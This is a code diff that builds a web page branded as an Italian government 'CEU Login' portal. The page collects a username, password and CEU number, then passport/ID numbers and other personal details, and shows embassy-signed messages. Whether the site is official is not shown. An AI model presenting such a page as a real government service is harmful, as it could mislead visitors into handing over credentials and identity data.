@@ -1,3 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Italian Republic - CEU Login</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+      background-color: #f0f4f8;
+      margin: 0;
+      padding: 0;
+    }
+    header, footer {
+      background-color: #003366;
+      color: white;
+      padding: 15px 30px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    header img, footer img {
+      height: 50px;
+    }
+    h2, h4 {
+      margin: 0;
+    }
+    .container {
+      max-width: 450px;
+      margin: 40px auto;
+      background-color: white;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      padding: 30px;
+    }
+    .form-group, .info-group, .links {
+      display: none;
+    }
+    .form-group.active, .info-group.active, .links.active {
+      display: block;
+    }
+    input, button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 12px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+    }
+    button {
+      background-color: #003366;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #00509e;
+    }
+    .loading {
+      display: none;
+      margin-top: 10px;
+    }
+    .error {
+      color: red;
+      margin-top: 10px;
+    }
+    .links button {
+      margin-top: 12px;
+    }
+    .a4-image {
+      width: 100%;
+      margin-top: 20px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+    }
+    @media screen and (max-width: 600px) {
+      header, footer {
+        flex-direction: column;
+        text-align: center;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <img src="logo.png" alt="Italy Logo">
+  <h2>Government of the Italian Republic</h2>
+</header>
+
+<div class="container form-group active" id="loginForm">
+  <h3>Login to CEU Account</h3>
+  <input type="text" id="username" placeholder="Username" />
+  <input type="password" id="password" placeholder="Password" />
+  <input type="text" id="ceu" placeholder="CEU Number" />
+  <button onclick="validateLogin()">Login</button>
+  <img id="loading1" class="loading" src="loading.gif" width="30" />
+  <p id="errorMsg" class="error"></p>
+</div>
+
+<div class="container info-group" id="infoForm">
+  <h3>Verify Personal Information</h3>
+  <input type="text" id="firstname" placeholder="First Name" />
+  <input type="text" id="lastname" placeholder="Last Name" />
+  <input type="text" id="nationality" placeholder="Nationality" />
+  <input type="text" id="passport" placeholder="Passport/ID Number" />
+  <input type="text" id="caseNumber" placeholder="Case Number" />
+  <button onclick="validatePersonal()">Continue</button>
+  <img id="loading2" class="loading" src="loading.gif" width="30" />
+  <p id="errorMsg2" class="error"></p>
+</div>
+
+<div class="container links" id="linksPanel">
+  <h3>Results</h3>
+  <div class="buttons-wrapper"></div>
+  <p>
+    Dear Sir/Madam,<br><br>
+    Please review your account carefully. If necessary, kindly upload any additional documents or required information through your account.<br><br>
+    Please note that all communications, as well as the receipt and submission of documents, will be handled exclusively through your account. Requests or submissions made outside of this channel will not be processed.<br><br>
+    Sincerely,<br>
+    Case Review Unit – Embassy of the Republic of Italy
+  </p>
+  <button onclick="logout()">Logout</button>
+</div>
+
+<footer>
+  <img src="logo1.png" alt="Footer Logo">
+  <h4>Ministry of Foreign Affairs - CEU Program</h4>
+</footer>
+
 <script>
 let currentUser = null;
 let userData = [];
@@ -58,9 +189,8 @@ async function validatePersonal() {
     toggleSection("infoForm", false);
     toggleSection("linksPanel", true);
 
-    // ایجاد دکمه‌های لینک‌ها به صورت داینامیک
     const linksDiv = document.querySelector(".buttons-wrapper");
-    linksDiv.innerHTML = ""; // پاک کردن لینک‌های قدیمی
+    linksDiv.innerHTML = "";
 
     for (let i = 1; i <= 5; i++) {
       if (currentUser["link" + i]) {
@@ -89,3 +219,6 @@ function logout() {
   document.getElementById("ceu").value = "";
 }
 </script>
+
+</body>
+</html>
